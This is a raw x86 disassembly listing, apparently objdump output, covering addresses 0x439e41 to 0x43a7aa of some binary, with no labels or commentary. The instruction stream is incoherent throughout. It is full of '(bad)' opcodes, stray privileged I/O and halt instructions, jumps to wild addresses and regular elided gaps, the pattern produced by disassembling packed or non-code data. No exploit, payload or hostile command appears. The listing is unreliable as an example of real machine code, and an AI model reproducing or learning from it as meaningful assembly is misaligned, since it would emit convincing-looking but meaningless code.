  439e41:	cmp    esp,DWORD PTR [esi+0x5db19bf3]
  439e47:	addr16 je 0x439ea3
  439e4a:	hlt    
  439e4b:	add    al,0xf4
  439e4d:	add    al,0x16
  439e4f:	lahf   
  439e50:	pop    ss
  439e51:	add    cl,ch
  439e53:	add    esp,DWORD PTR [esi]
  439e55:	mov    dl,0xaf
  439e57:	mov    eax,0xede2d213
  439e5c:	out    0x5c,eax
  439e5e:	push   ecx
  439e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439e60:	pop    esi
  439e61:	dec    edx
  439e62:	pop    ebp
  439e63:	push   ebx
  439e64:	or     cl,BYTE PTR [edx+0xd]
  439e67:	push   ebx
  439e68:	(bad)  
  439e69:	out    dx,al
  439e6a:	push   eax
  439e6b:	pushf  
  439e6c:	pushf  
  439e6d:	dec    edx
  439e6e:	cmp    DWORD PTR [esi],edx
  439e70:	xor    al,0x7c
  439e72:	push   DWORD PTR [esi-0x46feb8d9]
  439e78:	jge    0x439e84
  439e7a:	add    BYTE PTR [edi-0x78bc3b88],cl
  439e80:	jo     0x439e46
  439e82:	push   ebx
  439e83:	bound  edi,QWORD PTR [ebp+0x4895fa80]
  439e89:	retf   0xcd7c
  439e8c:	not    eax
  439e8e:	push   ebx
  439e8f:	xchg   ecx,eax
	...
  439ea8:	add    BYTE PTR [edi-0x701605b7],ch
  439eae:	inc    esp
  439eaf:	sahf   
  439eb0:	out    dx,al
  439eb1:	dec    ebp
  439eb2:	sub    edi,0x6c
  439eb5:	inc    esi
  439eb6:	(bad)  
  439eb7:	push   cs
  439eb8:	shl    DWORD PTR [ebx-0x63],1
  439ebb:	cli    
  439ebc:	(bad)  
  439ebd:	add    DWORD PTR [ebp-0x3e],eax
  439ec0:	out    0xdb,eax
  439ec2:	jnp    0x439f03
  439ec4:	jmp    0x31851b9e
  439ec9:	push   ecx
  439eca:	dec    eax
  439ecb:	sub    eax,0x6fd66fbf
  439ed0:	fs inc esi
  439ed2:	(bad)  
  439ed3:	adc    dh,BYTE PTR [edx+0x45]
  439ed6:	(bad)  
  439ed8:	push   eax
  439ed9:	cmp    eax,0xc4a9834f
  439ede:	std    
  439edf:	xchg   BYTE PTR [esi],dl
  439ee1:	test   al,0x61
  439ee3:	lds    edx,FWORD PTR [eax+0x2d]
  439ee6:	dec    edi
  439ee7:	sub    DWORD PTR [ecx-0x11790b4d],0xffffff89
  439eee:	add    al,0x87
  439ef0:	sahf   
  439ef1:	int    0xf9
  439ef3:	sub    DWORD PTR cs:[ebp-0x45cfa955],ebp
  439efa:	jmp    0xe97700fe
  439eff:	mov    bh,0x39
  439f01:	test   DWORD PTR [eax+eax*1],0x6eb8f600
  439f08:	aaa    
  439f09:	div    BYTE PTR [edi+0x336e]
	...
  439f23:	add    BYTE PTR [eax],al
  439f25:	add    al,dl
  439f27:	aad    0xc2
  439f29:	add    BYTE PTR ds:0xfb70705,bl
  439f2f:	call   0x63681cfb
  439f34:	xor    eax,esi
  439f36:	jle    0x439f3a
  439f38:	add    esi,0xfffffff6
  439f3b:	std    
  439f3c:	add    dh,0x7b
  439f3f:	call   0x7853122e
  439f44:	mov    ecx,0xadfbcc2a
  439f49:	shl    BYTE PTR [edi+0x3],0xe8
  439f4d:	mov    ecx,0x8bf5ae06
  439f52:	adc    BYTE PTR [ecx],ah
  439f54:	mov    BYTE PTR [ebp-0x17],al
  439f57:	fsin   
  439f59:	lds    ebx,FWORD PTR [eax]
  439f5b:	and    eax,0x874b0f00
  439f60:	push   ds
  439f61:	data16 into 
  439f63:	ret    
  439f64:	pusha  
  439f65:	or     DWORD PTR [ebp-0x2576a1e0],0x54
  439f6c:	add    eax,0xe2945db7
  439f71:	sbb    BYTE PTR [esi],ch
  439f73:	lods   eax,DWORD PTR ds:[esi]
  439f74:	cmc    
  439f75:	mov    edx,ecx
  439f77:	push   eax
  439f78:	add    eax,0xffffffe9
  439f7b:	jnp    0x439ff6
  439f7d:	jge    0x439f04
  439f7f:	add    al,0x83
  439f81:	sbb    eax,0x3a52d1
  439f86:	jns    0x439f86
  439f88:	popa   
  439f89:	adc    BYTE PTR [eax],al
	...
  439fa3:	loop   0x439fdb
  439fa5:	add    cl,BYTE PTR [ebp-0xb57766]
  439fab:	push   ds
  439fac:	cmp    DWORD PTR [esi-0x2e250bf4],0x831f40b
  439fb6:	callw  0x6978
  439fba:	or     esi,DWORD PTR [ecx-0x61]
  439fbd:	stos   BYTE PTR es:[edi],al
  439fbe:	dec    edi
  439fbf:	cmp    ebp,ebx
  439fc1:	add    ebx,0x0
  439fc4:	pop    ss
  439fc5:	retf   0x7e13
  439fc8:	cdq    
  439fc9:	out    dx,al
  439fca:	cli    
  439fcb:	test   eax,0x1b2e224d
  439fd0:	imul   ebx,DWORD PTR [edx],0xc94fbb8d
  439fd6:	pop    ss
  439fd7:	sbb    al,0xfa
  439fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439fda:	cli    
  439fdb:	add    ebx,esi
  439fdd:	rcl    DWORD PTR [edi],1
  439fdf:	lock (bad) 
  439fe1:	cli    
  439fe2:	cs mov ah,0x2
  439fe5:	sti    
  439fe6:	or     ah,BYTE PTR [edx+0x3b87fc18]
  439fec:	dec    edi
  439fed:	gs add al,0xcc
  439ff0:	mov    eax,ds:0xe2d3faac
  439ff5:	retf   0x5e0f
  439ff8:	repnz mov BYTE PTR [edx-0x16],al
  439ffc:	in     eax,dx
  439ffd:	test   eax,0xd08ea7fa
  43a002:	pop    ds
  43a003:	ja     0x439fa4
  43a005:	daa    
  43a006:	sti    
	...
  43a01f:	add    BYTE PTR [ecx],ah
  43a021:	add    ch,BYTE PTR [edx-0x73a93806]
  43a027:	inc    esp
  43a028:	rcr    BYTE PTR [edx-0x31],1
  43a02b:	pop    ds
  43a02c:	ja     0x439fcf
  43a02e:	sti    
  43a02f:	gs cmc 
  43a031:	in     eax,dx
  43a032:	test   eax,0x5132d0e7
  43a037:	cli    
  43a038:	jmp    0x43a040
  43a03a:	stos   DWORD PTR es:[edi],eax
  43a03b:	adc    edi,DWORD PTR [ebx]
  43a03d:	loopne 0x43a09a
  43a03f:	stc    
  43a040:	imul   eax,DWORD PTR [edx+eiz*2],0x0
  43a044:	hlt    
  43a045:	add    al,0xe9
  43a047:	sub    BYTE PTR [ecx],0xd0
  43a04a:	loop   0x439fd6
  43a04c:	(bad)  
  43a04d:	hlt    
  43a04e:	pop    ebx
  43a04f:	add    DWORD PTR [ebx+0x46],0x1d5b5741
  43a056:	not    DWORD PTR [ebp+0x3e]
  43a059:	jnp    0x43a084
  43a05b:	ins    DWORD PTR es:[edi],dx
  43a05c:	push   edx
  43a05d:	inc    esi
  43a05e:	sub    DWORD PTR [edi-0x40],edx
  43a061:	jnp    0x43a077
  43a063:	mov    bl,0xc5
  43a065:	adc    edi,DWORD PTR [esi]
  43a067:	mov    bl,0x93
  43a069:	test   al,ch
  43a06b:	add    esi,esp
  43a06d:	(bad)  
  43a06f:	mov    dl,0x91
  43a071:	add    eax,0x4f40391
  43a076:	test   eax,0xf1fc8056
  43a07b:	lock xor esi,ebx
  43a07e:	test   al,0x3
  43a080:	jae    0x43a0d7
  43a082:	gs push ebp
	...
  43a09c:	add    dh,bl
  43a09e:	rcl    DWORD PTR [edx],1
  43a0a0:	sbb    eax,0xfb5cf939
  43a0a5:	or     al,0xa8
  43a0a7:	clc    
  43a0a8:	iret   
  43a0a9:	in     eax,0xb1
  43a0ab:	jae    0x43a06d
  43a0ad:	repz mov ah,0xb9
  43a0b0:	shr    bl,1
  43a0b2:	inc    ebp
  43a0b3:	cmp    ecx,DWORD PTR [eax]
  43a0b5:	inc    esi
  43a0b6:	inc    esi
  43a0b7:	rol    edi,cl
  43a0b9:	stc    
  43a0ba:	(bad)  
  43a0bb:	call   0xe7150440
  43a0c0:	xchg   edx,eax
  43a0c1:	hlt    
  43a0c2:	scas   al,BYTE PTR es:[edi]
  43a0c3:	xchg   ecx,eax
  43a0c4:	lock div ecx
  43a0c7:	sub    BYTE PTR [esp+esi*2],al
  43a0ca:	dec    edx
  43a0cb:	out    0xcf,eax
  43a0cd:	sti    
  43a0ce:	inc    ebp
  43a0cf:	repz or ecx,DWORD PTR [esi+ebp*2+0x4aca2eff]
  43a0d7:	pop    ecx
  43a0d8:	arpl   WORD PTR [esi-0x4d4a352],si
  43a0de:	add    al,0x55
  43a0e0:	jb     0x43a0b5
  43a0e2:	mov    ah,0x50
  43a0e4:	mov    esi,0xb65249e6
  43a0e9:	pop    ebp
  43a0ea:	inc    edi
  43a0eb:	push   ecx
  43a0ec:	sar    eax,cl
  43a0ee:	fdiv   st(7),st
  43a0f0:	call   0xbd3e25ec
  43a0f5:	dec    DWORD PTR [ecx+0x14]
  43a0f8:	test   eax,0x70000625
  43a0fd:	popa   
  43a0fe:	(bad)  
  43a0ff:	jle    0x43a122
	...
  43a119:	add    dl,al
  43a11b:	shr    DWORD PTR [edi+0x64],1
  43a11e:	cmp    al,0x4e
  43a120:	push   eax
  43a121:	mov    ecx,0xdb37f0a2
  43a126:	aaa    
  43a127:	inc    esi
  43a128:	sub    DWORD PTR [ecx],0x2b
  43a12b:	scas   al,BYTE PTR es:[edi]
  43a12c:	cmp    BYTE PTR [ebx+ecx*2-0x2f],dh
  43a130:	dec    esi
  43a131:	bound  esi,QWORD PTR [ebp+ecx*2+0xdf42f88]
  43a138:	ret    
  43a139:	push   esp
  43a13a:	hlt    
  43a13b:	jnp    0x43a176
  43a13d:	ret    0xdee5
  43a140:	add    eax,DWORD PTR [ecx-0x10]
  43a143:	adc    al,0x0
  43a145:	jmp    0xd53e53d1
  43a14a:	or     esi,ebp
  43a14c:	aas    
  43a14d:	jmp    0xa67aa4d0
  43a152:	les    edx,FWORD PTR ds:0xfdbb7453
  43a158:	push   eax
  43a159:	sahf   
  43a15a:	stos   BYTE PTR es:[edi],al
  43a15b:	add    DWORD PTR [eax-0x6a],edx
  43a15e:	ret    0xfafd
  43a161:	hlt    
  43a162:	dec    ebx
  43a163:	idiv   DWORD PTR [edi]
  43a165:	add    BYTE PTR [ebp-0x768b453a],cl
  43a16b:	jl     0x43a1b0
  43a16d:	or     BYTE PTR [esi+0x5174fe87],ah
  43a173:	jno    0x43a174
  43a175:	jmp    0x14d:0x7ffa58f4
  43a17c:	dec    edi
  43a17d:	inc    DWORD PTR [eax]
	...
  43a197:	repz scas eax,DWORD PTR es:[edi]
  43a199:	adc    edx,eax
  43a19b:	dec    esp
  43a19c:	inc    ecx
  43a19d:	cli    
  43a19e:	inc    BYTE PTR [ebx+0x5115f6f9]
  43a1a4:	push   esp
  43a1a5:	cmp    al,BYTE PTR [eax]
  43a1a7:	das    
  43a1a8:	rcl    DWORD PTR [ebp-0x37],0xdf
  43a1ac:	add    al,0x0
  43a1ae:	push   esi
  43a1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a1b0:	mov    al,0x81
  43a1b2:	push   es
  43a1b3:	nop
  43a1b4:	shr    BYTE PTR [esi+0xe],0x75
  43a1b8:	add    DWORD PTR [eax-0x5a4e300],eax
  43a1be:	dec    edi
  43a1bf:	cli    
  43a1c0:	push   ebp
  43a1c1:	retf   0x4d11
  43a1c4:	add    DWORD PTR [ebx-0xf3c2a8a],eax
  43a1ca:	je     0x43a19e
  43a1cc:	jb     0x43a1c3
  43a1ce:	adc    eax,0x3a35d1
  43a1d3:	sbb    eax,esi
  43a1d5:	push   ebx
  43a1d6:	mov    edi,DWORD PTR [ecx-0x2eef1979]
  43a1dc:	or     BYTE PTR [eax],al
  43a1de:	push   ebx
  43a1df:	jecxz  0x43a252
  43a1e1:	mov    eax,DWORD PTR [ebp-0xa2283]
  43a1e7:	or     eax,0x9d00f031
  43a1ec:	or     bh,dh
  43a1ee:	adc    eax,0x3a35b1
  43a1f3:	in     eax,0x1b
  43a1f5:	cmc    
  43a1f6:	add    ah,dh
  43a1f8:	sub    eax,0x72fe
	...
  43a211:	add    BYTE PTR [eax],al
  43a213:	add    BYTE PTR [eax],bl
  43a215:	pop    edi
  43a216:	dec    esp
  43a217:	cli    
  43a218:	or     DWORD PTR [esi],esi
  43a21a:	data16 daa 
  43a21c:	int    0xc2
  43a21e:	push   ebx
  43a21f:	dec    edi
  43a220:	fmul   QWORD PTR [ecx]
  43a222:	sar    BYTE PTR [edi],1
  43a224:	hlt    
  43a225:	add    eax,0x2db489d0
  43a22a:	xchg   edi,eax
  43a22b:	add    esi,ebp
  43a22d:	sub    eax,0xd6918cfe
  43a232:	push   ecx
  43a233:	cli    
  43a234:	dec    ebx
  43a235:	mov    cl,0x8f
  43a238:	inc    ebx
  43a239:	retf   
  43a23a:	jg     0x43a1ff
  43a23c:	in     al,0xae
  43a23e:	push   esi
  43a23f:	cli    
  43a240:	test   al,0x3a
  43a242:	xchg   edx,eax
  43a244:	(bad)  
  43a245:	loopne 0x43a2c0
  43a247:	out    dx,eax
  43a248:	pop    ds
  43a249:	jmp    0x43a29e
  43a24b:	dec    edi
  43a24c:	sbb    ebx,DWORD PTR [ecx+0x104be802]
  43a252:	push   ebp
  43a253:	cli    
  43a254:	jno    0x43a244
  43a256:	retf   0x8e1f
  43a259:	sub    eax,0x2df47fe6
  43a25e:	(bad)  
  43a25f:	gs cmc 
  43a261:	xchg   esi,edi
  43a263:	gs cmc 
  43a265:	test   esi,edi
  43a267:	push   esp
  43a269:	ins    DWORD PTR es:[edi],dx
  43a26a:	dec    esi
  43a26b:	je     0x43a255
  43a26d:	(bad)  
  43a26e:	clc    
  43a26f:	aas    
  43a270:	out    0xed,al
  43a272:	add    edi,DWORD PTR [edi-0x34]
  43a275:	push   edx
  43a276:	fmul   DWORD PTR ds:0x0
	...
  43a290:	add    BYTE PTR [edx],bh
  43a292:	lods   eax,DWORD PTR ds:[esi]
  43a293:	dec    ebp
  43a294:	(bad)  
  43a295:	hlt    
  43a296:	sub    eax,0x3f8a6dfe
  43a29b:	ds pop edx
  43a29d:	dec    edx
  43a29e:	pop    ss
  43a29f:	cmp    eax,0xe904ecbd
  43a2a4:	mov    bl,0x9e
  43a2a6:	sbb    ebp,esp
  43a2a8:	not    bl
  43a2aa:	add    al,0x59
  43a2ac:	add    eax,0x7f333293
  43a2b1:	pop    DWORD PTR [ebp+0x4f7f494]
  43a2b7:	jmp    0x641f6872
  43a2bc:	mov    DWORD PTR [ebx+0x3f],ebx
  43a2bf:	imul   edx,DWORD PTR [ebx-0x4d],0xf4045aac
  43a2c6:	add    al,0x5a
  43a2c8:	stc    
  43a2c9:	pop    ss
  43a2ca:	sbb    BYTE PTR [ecx+0x5401bc03],ch
  43a2d0:	add    al,0xf4
  43a2d2:	add    al,0xba
  43a2d4:	mov    eax,0x89503b0a
  43a2d9:	fild   DWORD PTR [ebx+0x31]
  43a2dc:	mov    ah,0x93
  43a2de:	mov    al,0xb4
  43a2e0:	ret    
  43a2e1:	and    ebp,DWORD PTR [ebx+0x4db8270]
  43a2e7:	pop    esi
  43a2e8:	or     ch,dh
  43a2ea:	add    al,0xe9
  43a2ec:	or     BYTE PTR [eax+0x3c],0xb
  43a2f0:	push   ebx
  43a2f1:	(bad)  
  43a2f2:	sub    ecx,DWORD PTR [esi-0x7d]
	...
  43a30d:	add    dh,bh
  43a30f:	inc    edx
  43a310:	gs dec eax
  43a312:	inc    DWORD PTR [ebp-0x1198ad10]
  43a318:	pop    ebp
  43a319:	dec    ebx
  43a31a:	xor    edx,DWORD PTR [eax+0x42e2536b]
  43a320:	fnstenv [ebx+0x5be0b8ce]
  43a326:	out    0x26,eax
  43a328:	retf   0x7852
  43a32b:	inc    ebp
  43a32c:	cmp    al,0x3
  43a32e:	push   edx
  43a32f:	add    eax,0x41fbd8ba
  43a334:	(bad)  
  43a335:	fild   DWORD PTR [ebx+0x6ce94010]
  43a33b:	xor    BYTE PTR [esi+esi*8-0x53],0xc3
  43a340:	stc    
  43a341:	add    eax,0xa92d71aa
  43a346:	inc    esi
  43a347:	fcom   QWORD PTR [esi-0x60]
  43a34a:	cmp    DWORD PTR [esi],eax
  43a34c:	add    BYTE PTR [ecx],bh
  43a34e:	lock sub esp,esi
  43a351:	fs mov bh,0xb5
  43a354:	sbb    cl,BYTE PTR [edi]
  43a356:	jae    0x43a352
  43a358:	sub    esp,esi
  43a35a:	push   eax
  43a35b:	btr    DWORD PTR [ecx+0x3084a6f1],esi
  43a362:	sub    ecx,DWORD PTR [esi]
  43a364:	jg     0x43a3b6
  43a366:	adc    eax,0x7ac706b8
  43a36b:	mov    edx,0x61ce903
  43a370:	das    
  43a371:	sub    DWORD PTR [eax],eax
	...
  43a38b:	aaa    
  43a38c:	sub    DWORD PTR [esi],0x29
  43a38f:	mov    dl,0xd2
  43a391:	push   esp
  43a392:	bound  eax,QWORD PTR [ebx-0x1a]
  43a395:	or     edi,DWORD PTR [edi+0x422dd95e]
  43a39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a39c:	sbb    BYTE PTR [edx+edi*8+0x37],ah
  43a3a0:	inc    edx
  43a3a1:	test   DWORD PTR [ecx],ebx
  43a3a3:	ins    BYTE PTR es:[edi],dx
  43a3a4:	xor    al,0x74
  43a3a6:	jmp    0x43a422
  43a3a8:	cmp    BYTE PTR [edx],cl
  43a3aa:	ss std 
  43a3ac:	shl    edi,0x95
  43a3af:	ret    
  43a3b0:	pop    es
  43a3b1:	jg     0x43a3a4
  43a3b3:	adc    eax,0x734f04b9
  43a3b8:	xor    DWORD PTR [ebp+ecx*1+0x51],0x83a92e3a
  43a3c0:	mov    ds:0x1924e788,eax
  43a3c5:	dec    eax
  43a3c6:	add    BYTE PTR [edi-0x4a7d05bb],bl
  43a3cc:	shl    DWORD PTR [ebx+0xd],cl
  43a3cf:	aaa    
  43a3d0:	or     DWORD PTR [ebp-0x1],edx
  43a3d3:	enter  0xc99,0x40
  43a3d7:	lea    ecx,[edx-0x62601446]
  43a3dd:	or     dh,BYTE PTR [edx+edx*4+0x2b]
  43a3e1:	cmp    edi,0xffffffe9
  43a3e4:	inc    eax
  43a3e5:	pusha  
  43a3e6:	mov    DWORD PTR [ebx-0x79fd3f78],esi
  43a3ec:	xchg   ecx,eax
  43a3ed:	test   eax,0x1
	...
  43a406:	add    BYTE PTR [eax],al
  43a408:	add    dh,BYTE PTR [edi+0x5b]
  43a40b:	mov    cl,BYTE PTR [esi+0x4d04bc6f]
  43a411:	jp     0x43a394
  43a413:	in     al,dx
  43a414:	fisubr WORD PTR [edx+esi*8-0x18f4e7f]
  43a41b:	dec    DWORD PTR [ebp+0x7b]
  43a41e:	dec    ebp
  43a41f:	push   0x3a4e91
  43a424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a425:	int    0x4d
  43a427:	lea    ebx,[ecx-0x17]
  43a42a:	(bad)  
  43a42c:	mov    ch,0x45
  43a42e:	(bad)  
  43a430:	ror    BYTE PTR [ecx-0x3da88b46],cl
  43a436:	jle    0x43a45c
  43a438:	or     eax,0x3d000007
  43a43d:	ret    0x243e
  43a440:	add    DWORD PTR [ebp-0xb],esi
  43a443:	adc    eax,0x3a3acd
  43a448:	push   esi
  43a449:	fnstcw WORD PTR [ecx-0x2]
  43a44c:	rcr    BYTE PTR [eax+0x5a],cl
  43a44f:	lea    ecx,[ecx-0x18]
  43a452:	cmp    eax,DWORD PTR [edx]
  43a454:	fld    QWORD PTR [eax+ebp*8]
  43a457:	sub    esp,esi
  43a459:	push   esi
  43a45a:	dec    edi
  43a45b:	cli    
  43a45c:	js     0x43a4cc
  43a45e:	shl    DWORD PTR [ecx],1
  43a460:	imul   esi,DWORD PTR [edx+0x2df63c22],0xa9434ffe
  43a46a:	ret    0x23
	...
  43a485:	add    al,0x1e
  43a487:	pop    esp
  43a488:	call   DWORD PTR [eax+ebp*2+0x1ab4844f]
  43a48f:	icebp  
  43a490:	icebp  
  43a491:	jo     0x43a4e5
  43a493:	out    dx,al
  43a494:	std    
  43a495:	sub    DWORD PTR [esi],0xffffffee
  43a498:	jae    0x43a489
  43a49a:	mov    eax,0x95fc23ba
  43a49f:	jbe    0x43a49b
  43a4a1:	imul   esi,DWORD PTR [edi-0x158efaa5],0x27
  43a4a8:	or     ah,al
  43a4aa:	aad    0x79
  43a4ac:	ds push edx
  43a4ae:	fistp  QWORD PTR [ecx-0x7d]
  43a4b1:	adc    BYTE PTR [esi],bh
  43a4b3:	add    al,0x0
  43a4b5:	hlt    
  43a4b6:	jge    0x43a470
  43a4b8:	cli    
  43a4b9:	loope  0x43a4ec
  43a4bb:	hlt    
  43a4bc:	aas    
  43a4bd:	hlt    
  43a4be:	test   al,0x3e
  43a4c0:	je     0x43a515
  43a4c2:	mov    al,ds:0x5bf0144f
  43a4c7:	mov    esi,0xfead93ff
  43a4cc:	push   esp
  43a4ce:	jbe    0x43a51f
  43a4d0:	adc    al,0xd0
  43a4d2:	cmp    edi,DWORD PTR [esi-0xdf15501]
  43a4d8:	xlat   BYTE PTR ds:[ebx]
  43a4d9:	in     eax,0x6d
  43a4db:	inc    BYTE PTR [esp+esi*4-0x4b6b0062]
  43a4e2:	xchg   edi,eax
  43a4e3:	jnp    0x43a4c9
  43a4e5:	inc    ecx
  43a4e6:	jmp    0x43a563
  43a4e8:	inc    edx
	...
  43a501:	add    BYTE PTR [eax],bl
  43a503:	add    eax,0xb87ab636
  43a508:	and    ah,cl
  43a50a:	retf   0x1536
  43a50d:	sub    edi,esp
  43a50f:	fdivrp st(0),st
  43a511:	aad    0x17
  43a513:	xchg   edx,eax
  43a514:	in     al,dx
  43a515:	outs   dx,BYTE PTR ds:[esi]
  43a516:	mov    dl,0xc9
  43a518:	or     al,bl
  43a51a:	add    eax,0x9ed9e08c
  43a51f:	aas    
  43a520:	xor    al,0x28
  43a522:	add    al,0x4
  43a524:	mov    dl,0x83
  43a526:	mov    ebx,0x7fd6903f
  43a52b:	aas    
  43a52c:	xchg   ecx,eax
  43a52d:	mov    DWORD PTR [ebx-0x48],eax
  43a530:	fcmovnb st,st(2)
  43a532:	ret    0xe0de
  43a535:	ror    DWORD PTR [edi-0xd],1
  43a538:	test   al,0xae
  43a53a:	ret    0xec42
  43a53d:	add    edi,DWORD PTR [ebx-0x3a]
  43a540:	les    edi,FWORD PTR [edx-0x53]
  43a543:	and    BYTE PTR [eax+ecx*1-0x54],dh
  43a547:	setb   BYTE PTR [eax]
  43a54a:	or     al,0x92
  43a54c:	in     al,dx
  43a54d:	test   BYTE PTR [edx+0x8],bh
  43a550:	adc    DWORD PTR [ebx],eax
  43a552:	aaa    
  43a553:	sub    ecx,DWORD PTR [ecx+edi*4+0x7a]
  43a557:	xor    BYTE PTR ds:0xa55ee009,cl
  43a55d:	add    esi,DWORD PTR [ebx+0x68195dd6]
  43a563:	adc    eax,0x3a9
	...
  43a57c:	add    BYTE PTR [eax],al
  43a57e:	add    BYTE PTR [edi+0xf12e6aa],ah
  43a584:	xlat   BYTE PTR ds:[ebx]
  43a585:	mov    ecx,0xa3912b7a
  43a58a:	rep stos DWORD PTR es:[edi],eax
  43a58c:	aas    
  43a58d:	jnp    0x43a58a
  43a58f:	out    dx,al
  43a590:	mov    eax,0x3eeed9d8
  43a595:	call   FWORD PTR [esi]
  43a597:	ins    DWORD PTR es:[edi],dx
  43a598:	jle    0x43a60d
  43a59a:	ret    
  43a59b:	neg    bh
  43a59d:	or     edi,DWORD PTR [esi]
  43a59f:	scas   al,BYTE PTR es:[edi]
  43a5a0:	add    cl,BYTE PTR [ebp+0x4ecec024]
  43a5a6:	(bad)  
  43a5a7:	pushf  
  43a5a8:	push   es
  43a5a9:	sti    
  43a5aa:	hlt    
  43a5ab:	fwait
  43a5ac:	adc    BYTE PTR [eax-0x17],al
  43a5af:	jl     0x43a62f
  43a5b1:	jae    0x43a598
  43a5b3:	xchg   DWORD PTR ds:0x5bdd9e7,eax
  43a5b9:	push   ebx
  43a5ba:	push   ss
  43a5bb:	arpl   bx,dx
  43a5bd:	cli    
  43a5be:	sbb    al,0x88
  43a5c0:	cmp    esi,DWORD PTR [ecx+esi*8+0x3a]
  43a5c4:	push   esp
  43a5c5:	sub    eax,0x56dc52a9
  43a5ca:	sub    al,0x36
  43a5cc:	or     al,BYTE PTR [eax]
  43a5ce:	pop    ds
  43a5cf:	stos   DWORD PTR es:[edi],eax
  43a5d0:	cmp    ah,BYTE PTR [ebx+0x72]
  43a5d3:	ins    BYTE PTR es:[edi],dx
  43a5d4:	out    dx,al
  43a5d5:	(bad)  
  43a5d6:	call   0xdd912bd2
  43a5db:	fmulp  st(7),st
  43a5dd:	adc    esi,DWORD PTR [edx+0x25]
  43a5e0:	out    0xb8,al
  43a5e2:	add    DWORD PTR [eax],eax
	...
  43a5fc:	lock add al,0x0
  43a5ff:	sbb    dh,BYTE PTR [ebx-0x14824012]
  43a605:	mov    ds:0xe513eb7b,eax
  43a60a:	shr    BYTE PTR [esi],0xf4
  43a60d:	cmp    eax,0x84c74bf2
  43a612:	cli    
  43a613:	xchg   edx,eax
  43a614:	imul   ecx,eax,0x65
  43a617:	jb     0x43a64e
  43a619:	push   cs
  43a61a:	xchg   ebx,edi
  43a61c:	sub    al,0x5d
  43a61e:	pop    edx
  43a61f:	mov    bh,0xb6
  43a621:	fadd   DWORD PTR [esi+0x132a75fd]
  43a627:	add    BYTE PTR ds:0xeafff58b,al
  43a62d:	arpl   WORD PTR [edx],si
  43a62f:	fimul  WORD PTR [esi+0x60c08501]
  43a635:	pop    es
  43a636:	sub    al,al
  43a638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a639:	cmp    edi,edi
  43a63b:	(bad)  
  43a63c:	fst    st(7)
  43a63e:	inc    ebx
  43a63f:	or     ah,cl
  43a641:	je     0x43a5c4
  43a643:	sbb    eax,0x3a3301
  43a648:	adc    dl,BYTE PTR [esi+0xb]
  43a64b:	push   0xffffff9d
  43a64d:	ror    cl,1
  43a64f:	mov    ds:0x39efa1,eax
  43a654:	adc    cl,cl
  43a656:	loope  0x43a683
  43a658:	in     eax,0xb0
  43a65a:	mov    BYTE PTR [eax-0x63],al
  43a65d:	mov    esp,0xe8f2
	...
  43a676:	add    BYTE PTR [eax],al
  43a678:	add    BYTE PTR [esi+ecx*8],bh
  43a67b:	cmc    
  43a67c:	call   DWORD PTR [esi]
  43a67e:	push   cs
  43a67f:	cmp    dh,bl
  43a681:	push   ds
  43a682:	or     DWORD PTR [eax+0x68],edx
  43a685:	lds    edi,FWORD PTR [esi-0x378affc6]
  43a68b:	clc    
  43a68c:	dec    edx
  43a68e:	mov    ebx,0x43bb340b
  43a693:	cli    
  43a694:	dec    edi
  43a695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a696:	mov    edi,0x8caafdec
  43a69b:	mov    edx,0xc0135275
  43a6a0:	jmp    0x43af1c
  43a6a5:	cmp    DWORD PTR [esi-0x715a138d],0xfffffffa
  43a6ac:	dec    DWORD PTR ds:0xda23c1d9
  43a6b2:	iret   
  43a6b3:	add    esi,0x33c9d04d
  43a6b9:	hlt    
  43a6ba:	push   ss
  43a6bb:	mov    eax,ds:0xfe6a1a3b
  43a6c0:	ss mov ebx,0xf4948233
  43a6c6:	sub    eax,0xc62986fe
  43a6cb:	in     eax,dx
  43a6cc:	aas    
  43a6cd:	hlt    
  43a6ce:	test   DWORD PTR [esi-0x51d1cb77],eax
  43a6d4:	cli    
  43a6d5:	mov    ds:0x34893bd6,al
  43a6da:	cs dec ebx
  43a6dc:	xor    al,0x0
	...
  43a6f6:	clc    
  43a6f7:	imul   edi,DWORD PTR [edi+0x29ee56ff],0x3e
  43a6fe:	hlt    
  43a6ff:	jp     0x43a735
  43a701:	shl    BYTE PTR [si-0x42],0x9a
  43a707:	xor    DWORD PTR [edx],ecx
  43a709:	fidiv  DWORD PTR [edi]
  43a70b:	cs lahf 
  43a70d:	inc    ebx
  43a70e:	stos   BYTE PTR es:[edi],al
  43a70f:	out    dx,eax
  43a710:	add    edi,ebx
  43a712:	stos   BYTE PTR es:[edi],al
  43a713:	push   es
  43a714:	dec    esp
  43a715:	mov    DWORD PTR [esi+ebp*1],esi
  43a718:	dec    ebx
  43a719:	xor    al,0x30
  43a71b:	fs mov edi,0x29f696ff
  43a721:	ds hlt 
  43a723:	mov    dl,0x34
  43a725:	addr16 call 0x53436605
  43a72b:	sbb    DWORD PTR [eax],edx
  43a72d:	fidiv  DWORD PTR [edi+0x224b9f2d]
  43a733:	outs   dx,DWORD PTR ds:[esi]
  43a734:	(bad)  
  43a735:	cli    
  43a736:	and    al,BYTE PTR [esi-0x1a]
  43a739:	mov    dh,BYTE PTR [ebp+ebp*1+0x1be8344b]
  43a740:	sar    bh,0x56
  43a743:	sahf   
  43a744:	sub    al,0x3e
  43a746:	hlt    
  43a747:	jmp    0xc043:0x4a89e34
  43a74e:	or     edi,ebp
  43a750:	fcmovnb st,st(3)
  43a752:	sbb    eax,0xf3d6e8c8
  43a757:	std    
  43a758:	retf   
  43a759:	mov    DWORD PTR [eax],0x0
	...
  43a773:	int    0xc7
  43a775:	call   0xbc41ab51
  43a77a:	mov    ebx,0xd7e8c7bd
  43a77f:	jmp    0x43a77e
  43a781:	stos   DWORD PTR es:[edi],eax
  43a782:	mov    bl,0xad
  43a784:	(bad)  
  43a785:	call   0xa2439b59
  43a78a:	shl    bh,1
  43a78c:	je     0x43a775
  43a78e:	pop    esi
  43a78f:	mov    ecx,0x4eaaa8f5
  43a794:	loopne 0x43a745
  43a796:	inc    esi
  43a797:	test   DWORD PTR [esi+edx*1],0xc587cb7f
  43a79e:	add    eax,0xe7c11521
  43a7a3:	loop   0x43a7e0
  43a7a5:	mov    eax,ds:0xe1b04b80
  43a7aa:	xchg   al,dh
